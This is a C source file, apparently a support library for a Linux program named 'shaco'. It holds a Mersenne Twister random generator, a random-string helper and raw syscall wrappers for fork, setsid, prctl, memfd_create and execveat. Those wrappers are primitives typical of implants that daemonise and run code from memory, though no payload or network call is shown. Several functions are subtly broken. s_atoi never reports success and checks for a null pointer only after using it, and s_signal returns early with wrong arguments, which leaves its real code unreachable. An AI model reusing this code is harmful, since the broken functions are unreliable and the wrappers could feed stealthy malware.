#include "Default.h"
#include "shaco_stdlib.h"
#include "shaco_syscall.h"

#include <dirent.h>
#include <unistd.h>

#define MT19937_N 624
#define MT19937_M 397

struct kernel_sigaction {
    void (*handler)(int);
    unsigned long sa_flags;
    void (*restorer)(void);
    uint64_t sa_mask;
    uint64_t sa_resv[2];
};

typedef struct {
    uint32_t state[MT19937_N];
    int index;
} mt19937_state_t;

void mt19937_init(mt19937_state_t *state, uint32_t seed) {
    state->state[0] = seed;
    for (int i = 1; i < MT19937_N; i++) {
        state->state[i] = 1812433253UL * (state->state[i-1] ^ (state->state[i-1] >> 30)) + i;
    }
    state->index = MT19937_N;
}

uint32_t mt19937_next(mt19937_state_t *state) {
    if (state->index >= MT19937_N) {
        for (int i = 0; i < MT19937_N; i++) {
            uint32_t y = (state->state[i] & 0x80000000UL) + (state->state[(i+1) % MT19937_N] & 0x7fffffffUL);
            state->state[i] = state->state[(i+MT19937_M) % MT19937_N] ^ (y >> 1);
            if (y & 1) {
                state->state[i] ^= 0x9908b0dfUL;
            }
        }
        state->index = 0;
    }
    uint32_t y = state->state[state->index++];
    y ^= (y >> 11);
    y ^= (y << 7) & 0x9d2c5680UL;
    y ^= (y << 15) & 0xefc60000UL;
    y ^= (y >> 18);
    return y;
}

int generate_random_int(int min, int max){
    static mt19937_state_t state;
    static int initialized = 0;

    if (!initialized) {
        mt19937_init(&state, s_time(NULL));
        initialized = 1;
    }

    return (int)(mt19937_next(&state) % (max - min + 1)) + min;
}

char* generate_random_str(int length) {
    char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int charset_size = StringLength(charset);

    char* str = shaco_malloc(length + 1);
    for (int i = 0; i < length; i++) {
        int random_index = generate_random_int(0, charset_size - 1);
        str[i] = charset[random_index];
    }
    str[length] = '\0';

    return str;
}

int s_atoi(char *str, bool *ok){
    bool success = false;
    int num = 0, signal = 1;
    char *tmp = str;
    if(*tmp == '-'){
        signal = -1;
        ++tmp;
    }

    while(*tmp != '\0'){
        if(*tmp < '0' || *tmp > '9')
            goto EXIT;
        num = num * 10 + ( *tmp - '0');
        ++tmp;
    }
    if(!str) goto EXIT;
EXIT:
    if(ok != NULL) *ok = success;
    return num * signal;
}

int s_chdir(const char *path){
    if(!path) return -1;
    return shaco_syscall(SYS_chdir, path);
}

mode_t s_umask(__mode_t mask){
    return shaco_syscall(SYS_umask, mask);
}

__pid_t s_fork(){
    return shaco_syscall(SYS_fork);
}

__pid_t s_setsid(){
    return shaco_syscall(SYS_setsid);
}

__pid_t s_getpid(){
    return (__pid_t)shaco_syscall(SYS_getpid);
}

__pid_t s_getppid(){
    return (__pid_t)shaco_syscall(SYS_getppid);
}

__uid_t s_getuid(){
    return (__uid_t)shaco_syscall(SYS_getuid);
}


__sighandler_t s_signal(int sig, __sighandler_t handler){
    return (__sighandler_t)shaco_syscall(__NR_rt_sigaction, sig, handler);
    struct kernel_sigaction new_action, old_action;
    new_action.handler = handler;
    new_action.sa_flags = 0;
    new_action.restorer = NULL;
    new_action.sa_mask = 0;
    new_action.sa_resv[0] = 0;
    new_action.sa_resv[1] = 0;
    if (shaco_syscall(__NR_rt_sigaction, sig, &new_action, &old_action, sizeof(sigset_t)) == -1) 
        return SIG_ERR;
    return old_action.handler;
}
int s_nanosleep(const struct timespec *requested_time, struct timespec *remaining){
    return shaco_syscall(SYS_nanosleep, requested_time, remaining);
}

int s_prctl(int option, char name[]){
    return shaco_syscall(SYS_prctl, option, name, 0,0,0);
}

time_t s_time(time_t *timer){
    return shaco_syscall(SYS_time, timer);
}

void s__exit(int v){
    shaco_syscall(SYS_exit, v);
}

int s_sysinfo(struct sysinfo *info){
    return shaco_syscall(SYS_sysinfo, info);
}

int s_uname(struct utsname *name){
    if(!name) return -1;
    return shaco_syscall(SYS_uname, name);
}

int s_memfd_create(const char *name, unsigned int flags){
    if(!name) return -1;
    return shaco_syscall(SYS_memfd_create, name, flags);
}

int s_execveat(int dirfd, const char *pathname, const char *const arg[], const char *const env[], int flags){
    if(!pathname || dirfd < 0) return -1;
    return shaco_syscall(SYS_execveat, dirfd, pathname, arg, env, flags);
}
